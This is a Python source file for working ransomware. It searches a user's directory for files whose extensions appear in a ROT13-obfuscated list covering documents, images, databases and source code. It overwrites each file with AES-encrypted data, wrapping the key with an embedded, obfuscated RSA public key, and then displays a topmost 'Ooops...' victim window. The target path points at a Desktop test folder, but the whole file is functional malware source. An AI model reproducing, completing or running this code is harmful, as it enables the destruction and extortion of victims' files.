from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
import base64
import zlib
import string
import os
import tkinter
from multiprocessing import Pool, cpu_count, freeze_support
from time import time
import codecs


ENCRYPTABLE_FILETYPES = ["qng", "xrlpunva", "fqs", "ips", "wct", "cat", "gvss", "gvs", "tvs", "wcrt", "wvs", "wsvs",
                          "wc2", "wck", "w2x", "w2p", "sck", "cpq", "ozc", "fit", "3qz", "3qf", "znk", "bow", "qqf",
                          "cfq", "gtn", "guz", "gvs", "gvss", "lhi", "nv", "rcf", "cf", "fit", "vaqq", "cpg", "zc4",
                          "niv", "zxi", "3t2", "3tc", "nfs", "syi", "z4i", "zbi", "zct", "ez", "feg", "fjs", "ibo",
                          "jzi", "qbp", "qbpk", "gkg", "cqs", "ybt", "zft", "bqg", "cntrf", "egs", "grk", "jcq", "jcf",
                          "pfi", "trq", "xrl", "ccf", "ccg", "ccgk", "kzy", "wfba", "kyfk", "kyfz", "kyfo", "kyf",
                          "zug", "zugzy", "ugz", "ugzy", "kygk", "cea", "qvs", "fyx", "kynz", "kyn", "bqf", "qbpz",
                          "qbgk", "qbgz", "kcf", "vpf", "zc3", "nvs", "vss", "z3h", "z4n", "zvq", "zcn", "jni", "jzn",
                          "zfv", "cuc", "ncx", "ncc", "ong", "ptv", "pbz", "nfc", "nfck", "pre", "psz", "pff", "ugz",
                          "ugzy", "wf", "wfc", "eff", "kugzy", "p", "pynff", "pcc", "pf", "u", "wnin", "yhn", "cy",
                          "cl", "fu", "fya", "fjvsg", "io", "ipkcebw", "qrz", "tnz", "arf", "ebz", "fni", "gtm", "mvc",
                          "ene", "gne", "7m", "poe", "qro", "tm", "cxt", "ecz", "mvck", "vfb", "trq", "nppqo", "qo",
                          "qos", "zqo", "fdy", "sag", "sba", "bgs", "ggs", "pst", "ces", "onx", "byq", "gzc", "gbeerag"]

public_key = """-----ORTVA CHOYVP XRL-----
ZVVOVwNAOtxduxvT9j0ONDRSNNBPND8NZVVOPtXPNDRNfFNJ8XcH0kAco1qXjZyY
//p09toNacA+WirpYGdU9pQwfA1hvdd+JOCcN3dd7b6qOCJTgyHfGJ+yyg8KDQi2
pI5E0FUad1JvBkm5Wz1G1G0kiLboS/ghyhKJzmx8p77Wss8pflpvcoKaxRiwFsSf
XxFIkOjpm46bOKYTrPBFwLi39OwOzWS67oxWxzKSyBY9yXtQ6sH2cKyyhbkykAZ/
0d14W3HMs/nioW9PYsM1OPzONbpEyPIW01ADYs+2f4PdKwxvQadW1GZW6a0XbWVO
ZZUFYkOdCzFnezz2lypdi5HDf4FTH/eQlDG/WFCzdaN2yW/xkw5bXdppjnejzr2P
xDVQNDNO
-----RAQ CHOYVP XRL-----"""


class ClsCrypt:
    @staticmethod
    def get_rsa_cipher(key):
        # Getting rsa key
        rsakey = RSA.importKey(key)
        return PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes()

    def crypt_file(self, plaintext):
        # File encryption
        compressed_text = zlib.compress(plaintext)
        session_key = get_random_bytes(16)
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(compressed_text)
        cipher_rsa, _ = self.get_rsa_cipher(codecs.encode(public_key, 'rot_13'))
        encrypted_session_key = cipher_rsa.encrypt(session_key)
        msg_payload = encrypted_session_key + cipher_aes.nonce + tag + \
                      ciphertext
        encrypted = base64.encodebytes(msg_payload)
        return encrypted

    @staticmethod
    def rot_13_decode(text):
        return codecs.encode(text, 'rot_13')

    def exfiltrate(self, document_path):
        # Overwriting a file
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(document_path, 'wb') as f1:
            f1.write(self.crypt_file(contents))

    @staticmethod
    def check_system_disk():
        for c in string.ascii_uppercase:
            system_disk = f"{c}:\\Users\\{os.getlogin()}"
            if os.path.isdir(system_disk):
                return system_disk + "\\Desktop\\test"

    @staticmethod
    def encode_ext(ext):
        encode_str = '\\'.join(hex(ord(c))[1:] for c in ext)
        encode_str = codecs.encode(ext, 'rot_13')
        return encode_str

    def check_files(self, dir_crypt):
        # Recursively search for files in the specified directory, taking into account 
        # extensions ENCRYPTABLE_FILETYPES
        result = []
        try:
            for dirpath, dirnames, filenames in os.walk(dir_crypt):
                for i in filenames:
                    fi, ext = os.path.splitext(i)
                    ext = self.encode_ext(ext[1:])
                    if ext in ENCRYPTABLE_FILETYPES:
                        result.append(f"{os.path.join(dirpath, i)}")
        except OSError:
            pass
        return result

    @staticmethod
    def window(time, count):
        # Pop-up window with information about getting the decryption key
        window = tkinter.Tk()
        window.overrideredirect(True)
        window.attributes("-topmost", True)
        window.geometry(f"900x430")
        window.config(bg="gray10", relief="flat")
        window.title("Ooops...")

        label_1 = tkinter.Label(window, text="err0rtic :)", font=("Arial", 20), fg="red")
        label_1.place(x=450, y=48, anchor="center")

        label_2 = tkinter.Label(window, text=f'File encryption was successful\nTime encryption: {time}\n' + f'Count file encryption: {count}\n',
                                font=("Arial", 20), fg="red", bg="gray10")
        label_2.place(x=450, y=130, anchor="center")

        try:
            window.mainloop()
        except:
            pass

    def run(self):
        # Running multi-threaded encryption
        thread = cpu_count()
        sys_disk = self.check_system_disk()
        list_file = self.check_files(sys_disk)
        start_time = time()
        with Pool(thread) as p:
            try:
                p.map(self.exfiltrate, list_file)
            except OSError as e:
                print(e)
        time_result = time() - start_time
        return time_result, len(list_file)


if __name__ == '__main__':
    freeze_support()
    Crypt = ClsCrypt()
    time, count = Crypt.run()
    Crypt.window(time, count)